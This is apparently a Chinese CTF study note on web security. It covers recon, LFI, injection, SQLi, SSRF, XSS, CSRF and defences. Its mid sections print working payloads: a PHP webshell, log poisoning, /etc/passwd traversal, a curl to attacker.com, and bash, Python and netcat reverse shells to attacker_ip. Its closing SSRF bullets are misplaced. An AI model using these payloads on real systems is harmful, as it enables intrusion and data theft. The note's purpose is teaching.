## Web
Web（World Wide Web）是建立在網際網路（Internet）上的資訊系統，由瀏覽器（Client）與伺服器（Server）進行互動，透過 HTTP 協議傳遞資料。

### 基本結構
- Client（用戶端）：如 Chrome，發出請求、接收與呈現網頁內容。
- Server（伺服器）：如 Apache/Nginx，接收請求、回傳 HTML/CSS/JS 等資源。
- HTTP(S)：資料傳輸協定，常見動作為 GET / POST。
- 網址（URL）：資源定位方式，如 `https://example.com/index.html`。

### 一次瀏覽器請求的流程：
1. 使用者輸入網址
2. DNS 查詢網址對應 IP
3. 與伺服器建立連線（TCP / TLS）
4. 發出 HTTP 請求（如 GET）
5. 接收伺服器回應的 HTML / CSS / JS
6. 呈現在瀏覽器畫面中

---

### 前端基礎

#### HTML
- 網頁的基本骨架，使用標籤（tag）來結構化內容。
```html
<h1>Hello JYC</h1>
<a href='flag.txt'>點我</a>
```

#### CSS
- 控制樣式（顏色、大小、位置）。
```css
body {
  background-color: black;
  color: #00ff00;
}
```

#### JavaScript
- 網頁的邏輯與互動語言，可控制 DOM、處理事件、操作 Cookie。
```javascript
document.cookie = 'jyc_token=1234';
alert('Hello from JS');
```

---

### Cookie 機制與應用

#### 什麼是 Cookie？
- Cookie 是瀏覽器儲存在本機的小型資料，常用於記憶登入狀態或使用者偏好。

#### 常見應用
- 登入驗證（token）
- 記住登入帳號
- 購物車資訊保存

#### Cookie 工具
- `document.cookie`：用 JS 存取 cookie
- 開發者工具 (F12) → Application → Cookies
- 修改 Cookie → 嘗試 Bypass 權限驗證

工具推薦：[Cookie-Editor](https://cookie-editor.com/)

---

### 雜湊（Hash）

#### Hash 是什麼？
- 將任意長度的資料輸入，輸出固定長度的不可逆字串，常用於密碼加密、完整性驗證。

#### 常見 Hash 演算法：
- MD5（128 位元，容易碰撞）
- SHA1（160 位元，也已不安全）
- SHA256 / SHA3（目前安全性較高）
```python
import hashlib

passwd = '1234'
print(hashlib.md5(passwd.encode()).hexdigest())  # '81dc9bdb52d04dc20036dbd8313ed055'
```

#### Hash 碰撞（Collision）
- 不同輸入產生相同輸出。CTF 題中可能用來繞過雜湊比對。

參考：
- [SHA1 碰撞實例](https://shattered.io/)
- [MD5 碰撞示範](https://www.mscs.dal.ca/~selinger/md5collision/)

---

### 工具

#### F12 開發者工具（DevTools）
- Elements：查看 HTML 結構，編輯前端內容
- Console：輸入 JavaScript 測試操作
- Network：觀察請求與回應 headers / cookies / status
- Application：查看 Cookie、LocalStorage、SessionStorage

#### curl（命令列發送 HTTP 請求）
```bash
curl http://example.com
curl -X POST -d 'user=admin&pass=1234' http://target.com/login
curl -b 'admin=1' http://target.com/panel
```

#### 其他推薦工具
- [Web CTF Cheatsheet](https://github.com/w181496/Web-CTF-Cheatsheet)
- [Wappalyzer 技術偵測工具](https://www.wappalyzer.com/)

---

## Web Security

### 解題三階段：Recon → Fuzz → Attack

#### Recon（偵察）
- 確認網站結構（robots.txt、路徑、隱藏檔案）
- 嘗試子域名列舉、備份檔案、Git 洩漏、錯誤訊息
- 觀察網址參數、Cookie、HTTP Header 等輸入點

#### Fuzz（模糊測試）
- 嘗試特殊輸入值觀察回應（如 `?id='`, `%00`, `<script>`）
- 嘗試各種參數組合與字典爆破
- 改變請求方法與 headers

#### Attack（實際攻擊）
- 利用明確弱點執行攻擊（LFI、Webshell、SQLi、繞過）
- 撰寫腳本實作利用或爆破
- 觀察 flag 輸出點與系統回應

---

### 資訊洩漏與偵察技巧（Info Leak）

#### robots.txt
- 位置固定於網站根目錄：`/robots.txt`
- 用於指示搜尋引擎不索引哪些頁面
- 有時含有管理路徑或 flag 提示

#### .git 洩漏（Git Leak）
- 若網站未移除 `.git` 目錄，可能還原出原始碼
- 工具推薦：[GitHack](https://github.com/lijiejie/GitHack)
```bash
python GitHack.py http://www.target.com/.git/
```

#### Vim Swapfile 洩漏
- Vim 編輯時會產生 `.swp`, `.swo`，可能含原始程式碼
- 試讀檔名加上 `.swp`：
```
http://target.com/index.php.swp
```
- 可用 `strings` 查看內容：
```bash
strings index.php.swp
```

#### 備份檔案 (.bak, .old, ~)
- 嘗試下列副檔名爆破：
```
index.php.bak
login.php.old
config.php~
```

#### Google Hacking（Dork）
- 使用搜尋語法找可疑頁面：
```
site:target.com intitle:index.of
site:target.com inurl:admin
filetype:log
```

---

### 工具輔助

#### ffuf（快速模糊測試）
```bash
ffuf -u http://target.com/FUZZ -w wordlist.txt
```

#### gobuster（路徑爆破）
```bash
gobuster dir -u http://target.com -w common.txt
```

#### 子域名工具
- [https://subdomainfinder.c99.nl/](https://subdomainfinder.c99.nl)

---

### 後端安全

#### Language Trick - PHP 弱型別繞過
PHP 中 `==` 會自動轉型，導致繞過：
```php
if ($_GET['pass'] == '0') { // 'false' == 0 → true
    echo 'Login success';
}
# 測試參數：?pass=false
```

#### Array Injection（參數陣列）
PHP 支援陣列傳遞參數，可造成邏輯錯誤：
```http
POST /login
username[]=admin&username[]=guest
```

#### Web 型態判斷（File vs Route）

| 類型   | 說明                       |
|--------|----------------------------|
| File   | URL 對應實體檔案 (.php)    |
| Route  | 使用框架由路由處理請求     |

判斷方法：
- URL 是否包含副檔名
- 嘗試加 `.php`、或改參數觀察錯誤格式



#### Webshell

若可上傳 `.php` 檔，最簡 shell 範例：
```php
<?php system($_GET['cmd']); ?>
```

副檔名繞過技巧：
- `.php.jpg`
- `.phtml`
- 修改 Content-Type：`application/x-php`



#### Path Traversal

跳目錄讀檔：
```
/view.php?file=../../../../etc/passwd
```



#### Arbitrary File Read

若檔名可控，嘗試任意讀檔：
```
/read?file=../../../config.php
```



#### LFI（Local File Inclusion）

從本地引入檔案漏洞：
```
/?file=../../etc/passwd
```



#### PHP 偽協議

PHP 支援下列偽協議可繞過限制：

- `php://filter/convert.base64-encode/resource=xxx`
- `php://input` → 用 POST 傳送內容
- `data://text/plain;base64,PD9waHAgc3lzdGVtKCdscycpOz8+`

範例：
```
?file=php://filter/read=convert.base64-encode/resource=index.php
```



#### LFI to RCE 技巧

##### Log Poisoning（日誌注入）
將 PHP 程式碼寫入日誌並透過 LFI 執行：
```bash
curl -A "<?php system($_GET['cmd']); ?>" http://target.com
```
然後：
```
http://target.com/index.php?file=/var/log/apache2/access.log&cmd=id
```



#### Reverse Shell

##### 定義與原理
讓目標主機主動連線回攻擊者，取得互動式 shell。

##### 使用時機
- 已能執行命令或上傳 Webshell
- RCE 無法看輸出 → 透過連線取得 shell
- 避開防火牆限制入站流量

##### 常見語法

**Bash**
```bash
bash -i >& /dev/tcp/attacker_ip/1234 0>&1
```

**Python**
```python
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("attacker_ip",1234));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
```

**Netcat**
```bash
nc -e /bin/bash attacker_ip 1234
```

**反向聽端**
```bash
nc -lvnp 1234
```

---

### Injection

#### Code Injection
- 利用 eval()、exec() 等執行使用者輸入。

示範程式：
```python
@app.route('/code')
def code():
    return eval(request.args.get('input'))
```

URL 測試：
```
http://target.com/code?input=1+1
http://target.com/code?input=__import__('os').system('ls')
```

繞過技巧：
- `__class__`、`__subclasses__()` 取出隱藏類別
- `chr()` 組字串避開限制
- base64 + `eval(decode)` 執行



#### Command Injection
- 將輸入納入系統指令執行，造成命令注入。

測試範例：
```
http://target.com/ping?host=127.0.0.1;id
```

常見符號：
- `;`, `|`, `&&`, `$()`, `` ` ``

繞過技巧：
- URL encode → `%26%26id`
- 空格繞過 → `$IFS`：`curl$IFShttp://attacker.com`



#### Argument Injection
- 控制指令參數內容，導致意外行為。

測試範例：
```
curl -X POST -d 'file=--help' http://target.com/zip
```

或：
```
file=../../etc/passwd;--option
```

繞過技巧：
- 混合 CLI 參數與指令邏輯
- 與 Command Injection 合併使用



### SQL Injection

SQL Injection 是透過在輸入中注入惡意 SQL 語句，操控資料庫執行未授權操作，常見於登入繞過、資料洩漏及資料篡改。

- **攻擊手法：**
  - 單引號終止字串，如 `' OR '1'='1`
  - 利用布林條件繞過驗證
  - UNION 查詢合併多個結果
  - 盲注（Blind SQL Injection），透過回應推斷資料

- **防禦方法：**
  - 使用參數化查詢（Prepared Statements）
  - 使用 ORM 工具避免手寫 SQL
  - 嚴格輸入驗證與過濾
  - 限制資料庫使用者權限



### NoSQL Injection

NoSQL Injection 針對 NoSQL 資料庫（如 MongoDB）利用 JSON 查詢結構注入惡意條件，達成繞過驗證或資料洩漏。

- **攻擊手法：**
  - 利用特殊操作符，如 `$ne`、`$gt`、`$in` 等改變查詢條件
  - 直接注入 JSON 結構，如 `{ "username": { "$ne": null } }`

- **防禦方法：**
  - 限制和驗證輸入型態，避免直接接受物件
  - 避免直接拼接 JSON 查詢，使用官方 API
  - 過濾和禁止特殊操作符出現
  - 限制資料庫權限

---

### SSRF (Server Side Request Forgery)

SSRF 利用後端伺服器發送請求能力，誘使伺服器向攻擊者指定的內外網目標發送請求，可能取得內網資訊或攻擊內網服務。

- **攻擊手法：**
  - 控制伺服器請求 URL，向內網或受限資源發送請求
  - 探測內網拓撲
  - 存取內網敏感服務或元資料服務

- **防禦方法：**
  - 嚴格限制可請求的目標域名或 IP 範圍
  - 驗證並過濾輸入 URL
## 前端安全（Frontend Security）

前端安全著重於瀏覽器端可能發生的漏洞與攻擊，例如惡意 JavaScript、輸入未過濾導致的腳本注入、DOM 操控、使用者敏感資料外洩等。本節重點包含：

- XSS（跨站腳本攻擊）
- CSRF（跨站請求偽造）
- Clickjacking（點擊劫持）
- CORS 設定問題
- 前端框架安全問題
- JWT / Cookie 安全
- 檔案上傳驗證失效

---

### XSS（Cross-Site Scripting）

#### 介紹
XSS 是攻擊者在網頁中注入 JavaScript，當其他使用者瀏覽該頁面時即會執行。可能竊取 Cookie、進行操作等。

#### 種類
- **Reflected XSS（反射型）**
  - 利用 URL 傳入輸入，立即回應中反映。
  - 範例：`http://target.com/?q=<script>alert(1)</script>`

- **Stored XSS（儲存型）**
  - 惡意腳本儲存在資料庫或留言系統中，其他人讀取即觸發。
  
- **DOM-based XSS**
  - JavaScript 透過不安全 DOM 操作（如 `innerHTML`）將輸入插入畫面。

#### 測試語法
```html
<script>alert('JYC')</script>
<img src=x onerror=alert(1)>
"><svg/onload=alert(1)>
```

#### 防禦方式
- 對輸入與輸出做適當轉義（Escape）
- 使用框架的安全渲染（如 React 自動 Escape）
- 禁用 `eval`、`innerHTML` 等 API
- 使用 CSP（Content Security Policy）限制腳本來源

---

### CSRF（Cross-Site Request Forgery）

#### 介紹
CSRF 利用已登入使用者的身份，從第三方網站發送請求至受信任網站，執行未授權操作。

#### 攻擊條件
- 使用者已登入並持有有效 Cookie
- 網站未驗證請求來源

#### 範例攻擊
```html
<img src="http://target.com/delete?id=1">
<form method="POST" action="http://target.com/change_pw">
  <input name="pw" value="hacked">
</form>
```

#### 防禦方式
- 加入 CSRF Token，並驗證每次請求
- 驗證 Referer / Origin Header
- 限制 Cookie 為 `SameSite=Strict` 或 `Lax`
- 重要操作使用 POST 並加驗證

---

### Clickjacking（點擊劫持）

#### 介紹
攻擊者透過透明 iframe 嵌入目標網站，誘導使用者點擊特定位置，觸發操作。

#### 範例
```html
<iframe src="http://target.com" style="opacity:0;position:absolute;top:0;left:0;width:100%;height:100%"></iframe>
```

#### 防禦方式
- HTTP Header：`X-Frame-Options: DENY` 或 `SAMEORIGIN`
- 使用 `frame-ancestors` 限制 iframe 嵌入
- 對重要操作加入使用者確認

---

### CORS（跨來源資源共用）

#### 介紹
CORS 設定錯誤可能導致第三方網站可跨來源取得敏感資料。

#### 常見誤區
- 回傳 `Access-Control-Allow-Origin: *` 給所有網站
- 未檢查 `Access-Control-Allow-Credentials`

#### 防禦方式
- 僅允許可信任來源
- 不允許敏感資料 (`withCredentials`) 配合 `*` 使用
- 嚴格設定 `Access-Control-Allow-Headers`

---

### 前端框架安全

#### Vue / React 常見問題
- 使用 `v-html`、`dangerouslySetInnerHTML` 時易造成 XSS
- 未限制 Router 導致 IDOR 或未授權訪問
- 錯誤使用本地儲存存放敏感資料（如 Token）

#### 建議
- 避免使用 HTML 插入 API
- 前端路由需配合後端驗證權限
- 敏感資訊不要存於 localStorage / sessionStorage

---

### Cookie / JWT 安全

#### Cookie
- 避免 `HttpOnly=false`，否則可被 JS 讀取（XSS）
- 加上 `Secure`、`SameSite`、`Path` 限制範圍
- 敏感操作加入額外驗證（不只靠 Cookie）

#### JWT（JSON Web Token）
- 不要暴露 secret，可被 forged
- 注意 JWT 演算法混淆（如將 alg 改為 none）
- 加密敏感資訊，不要儲存明文帳號/密碼

---

### 檔案上傳驗證問題

#### 常見攻擊
- 上傳惡意腳本：如 `.php` Webshell
- 攻擊者繞過副檔名限制：`.php.jpg`、雙副檔 `.jpg.php`
- MIME Type 偽造或內容不符

#### 防禦建議
- 僅允許白名單副檔名
- 驗證 MIME Type 與內容
- 上傳目錄使用不可執行權限
- 上傳後重新命名檔案

---

### 前端除錯資訊外洩

#### 常見風險
- `console.log` 留下敏感資訊
- JavaScript Source Map 外洩（`.map` 檔可還原原始碼）
- Webpack 設定為 `development` 模式

#### 防禦建議
- 上線前移除所有 log 訊息
- 不應公開 .map 檔案
- 使用 `production` 模式打包前端

---

### 開發者工具偵測與攻擊

#### 攻擊者利用 DevTools
- 查看 API 請求與回應內容
- 修改 Cookie 或 JS 變數
- 嘗試執行前端函式操控狀態

#### 防禦建議
- 將關鍵邏輯放後端實作
- 使用 HMAC / 簽章驗證重要資料
- 使用 JS 混淆工具增加分析難度（但非萬全）

---
  - 透過防火牆或網路控管限制內網訪問
  - 避免直接使用用戶輸入做為請求 URL